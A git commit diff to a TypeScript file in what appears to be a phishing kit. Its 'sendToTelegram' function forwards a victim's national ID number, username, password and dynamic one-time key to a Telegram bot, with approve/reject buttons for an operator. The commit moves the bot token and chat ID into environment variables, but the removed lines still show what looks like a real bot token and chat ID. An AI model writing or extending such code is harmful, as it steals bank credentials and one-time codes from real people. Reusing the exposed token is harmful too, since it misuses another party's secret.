dbb8962b7c69c32404a55dfdc2e18e140714f360
iber-dev <ivermasco5@gmail.com>
2025-01-20 14:21:15 -0500

    refactor: :lock: se implemento el uso de variables de entorno
    se mejoro la siguridad de los datos usando variables de entorno

--- app/actions/telegram.ts
+++ app/actions/telegram.ts
@@ -2,17 +2,45 @@
 
 import type { UserData } from "../types/auth"
 
-const TELEGRAM_TOKEN = "7863206896:AAHHL8fP2d2Ln07KBHKj_YugEdaWePM5nf4"
-const TELEGRAM_CHAT_ID = 6198305531
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN as string
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID
 
+/**
+ * Sends a message to a specified Telegram chat with user data.
+ *
+ * @param {UserData} data - The user data to be sent to Telegram.
+ * @returns {Promise<{ success: boolean }>} - A promise that resolves to an object indicating the success status.
+ *
+ * @throws {Error} - Throws an error if the request to Telegram fails.
+ *
+ * @example
+ * const userData = {
+ *   cedula: "123456789",
+ *   usuario: "john_doe",
+ *   clave: "password123",
+ *   claveDinamica: "dynamicKey456"
+ * };
+ * 
+ * sendToTelegram(userData)
+ *   .then(response => {
+ *     if (response.success) {
+ *       console.log("Message sent successfully");
+ *     } else {
+ *       console.log("Failed to send message");
+ *     }
+ *   })
+ *   .catch(error => {
+ *     console.error("Error:", error);
+ *   });
+ */
 export async function sendToTelegram(data: UserData) {
-  const message = `
-🔔 Nuevo ingreso:
-📝 Cédula: ${data.cedula}
-👤 Usuario: ${data.usuario}
-🔑 Clave: ${data.clave}
-🔐 Clave Dinámica: ${data.claveDinamica}
-  `
+const message = `
+  🔔 Nuevo ingreso:
+  📝 Cédula: ${data.cedula}
+  👤 Usuario: ${data.usuario}
+  🔑 Clave: ${data.clave}
+  🔐 Clave Dinámica: ${data.claveDinamica}
+`;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -24,14 +52,14 @@ export async function sendToTelegram(data: UserData) {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: "HTML",
-        reply_markup: JSON.stringify({
+        reply_markup: {
           inline_keyboard: [
             [
               { text: "Aprobar", callback_data: `approve_${data.cedula}` },
               { text: "Rechazar", callback_data: `reject_${data.cedula}` },
             ],
           ],
-        }),
+        },
       }),
     })
 
